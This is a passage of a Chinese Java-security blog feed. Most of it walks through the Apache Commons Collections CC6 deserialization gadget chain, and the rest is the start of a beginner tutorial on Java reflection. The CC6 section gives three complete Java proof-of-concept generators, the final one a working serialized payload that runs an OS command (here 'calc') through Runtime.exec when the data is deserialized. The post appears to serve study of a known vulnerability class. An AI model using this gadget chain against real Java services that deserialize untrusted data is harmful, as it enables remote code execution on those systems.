class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813153600-d5azomt.png" alt="image"></p><h1 id="CC6分析"><a href="#CC6分析" class="headerlink" title="CC6分析"></a>CC6分析</h1><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813171456-nap489x.png" alt="image"></p><p>首先 LazyMap().get()-&gt;InvokerTransformer.transform() 这段代码是不变的</p><p>我们通过 TiedMapEntry的hashCode方法</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813161648-a2bifd9.png" alt="image"></p><p>这里调用了一个getValue，getValue里面调用了map.get</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813161830-4mv4edr.png" alt="image"></p><p>看一下TiedMapEntry的构造函数</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813162503-1vrx564.png" alt="image"></p><p>我们来看一下HashMap的readObject方法</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813163214-1k9a1ro.png" alt="image"></p><p>也就是对它的key进行了hash</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813163319-fuvgih0.png" alt="image"></p><p>然后调用了它的hashCode，就走到了TiedMapEntry的hashcode，这里是一个同名函数的调用</p><p>所以就是把key传成TiedMapEntry</p><p>那么poc应该就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.example.CC1Test.serialize;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.example.CC1Test.unserialize;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">triedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(triedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;    <br>&#125;<br></code></pre></td></tr></table></figure><p>但是吸取那次URLDNS链的经验知道这么写在序列化就会被触发了</p><p>所以还要用到那个想法通过反射去改值</p><p>就改LazyMap的值</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813165408-dofb3pj.png" alt="image"></p><p>改成factory</p><p>这一步改完poc如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.example.CC1Test.serialize;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.example.CC1Test.unserialize;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">triedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(triedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是put的时候调用这个ConstantTransformer没有用的，在序列化的时候改成那个有用的</p><p>那么这个时候序列化不会执行，但是反序列化也不会执行</p><p>我们下一个断点调试一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813170351-q9pio3p.png" alt="image"></p><p>跟进去看一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813170927-gocndwc.png" alt="image"></p><p>这里已经把key给放进去了，那么我们在反序列化的时候就已经有这个key了，所以我们要把这个key给删掉</p><p>最终poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.example.CC1Test.serialize;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.example.CC1Test.unserialize;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">triedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(triedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250813171221-sv3e76r.png" alt="image"></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反射</title>
    <link href="/post/java-reflection-z1evhqq.html"/>
    <url>/post/java-reflection-z1evhqq.html</url>
    
    <content type="html"><![CDATA[<h1 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h1><p>在学习这种语言基础时，一定要要动手去写一些demo，不要只停留在看的层面</p><p>所以我写这篇博客的主要目的就是想要更直观的去了解Java反射，比较适合新手小白入门</p><h1 id="正射"><a href="#正射" class="headerlink" title="正射"></a>正射</h1><p>反射之中包含了一个「反」字，所以想要解释反射就必须先从「正」开始解释。</p><p>正射就是在编写代码时当需要使用到某一个类的时候，我们要先了解这个类是做什么的，然后实例化这个类，接着用实例化好的对象进行操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">action</span><span class="hljs-params">(String act)</span>&#123;<br>        System.out.println(act);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">22</span>);<br>        System.out.println(<span class="hljs-string">&quot;Name: &quot;</span> + person.name);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>而反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。</p><p>总结为四个步骤</p><p>1.操作Class</p><p>2.从原型class里面实例化对象</p><p>3.获取类里面属性</p><p>4.调用类里面方法</p><h2 id="操作Class"><a href="#操作Class" class="headerlink" title="操作Class"></a>操作Class</h2><p>加载类，返回Class类型的对象</p><p>讲反射的第一个就先了解一下getClass</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250804211041-7wt7g4b.png" alt="image"></p><p>这个是Object里面的一个final方法，会返回一个大Class类型</p><p>可以看一下大Class类里面有什么东西</p><h3 id="forname"><a href="#forname" class="headerlink" title="forname"></a>forname</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; forName(String className)<br>               <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>       Class&lt;?&gt; caller = Reflection.getCallerClass();<br>       <span class="hljs-keyword">return</span> forName0(className, <span class="hljs-literal">true</span>, ClassLoader.getClassLoader(caller), caller);<br>   &#125;<br></code></pre></td></tr></table></figure><p>返回的也是一个泛型的Class，就是你把它的名字传进去，就会返回对应的原型类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h2><h3 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> T <span class="hljs-title function_">newInstance</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> InstantiationException, IllegalAccessException<br>&#123;<br>    <span class="hljs-keyword">if</span> (System.getSecurityManager() != <span class="hljs-literal">null</span>) &#123;<br>        checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), <span class="hljs-literal">false</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>一个无参的方法</p><h3 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor"></a>getConstructor</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Constructor&lt;T&gt; <span class="hljs-title function_">getConstructor</span><span class="hljs-params">(Class&lt;?&gt;... parameterTypes)</span><br>    <span class="hljs-keyword">throws</span> NoSuchMethodException, SecurityException &#123;<br>    checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), <span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">return</span> getConstructor0(parameterTypes, Member.PUBLIC);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以接收参数</p><figure class="highlight 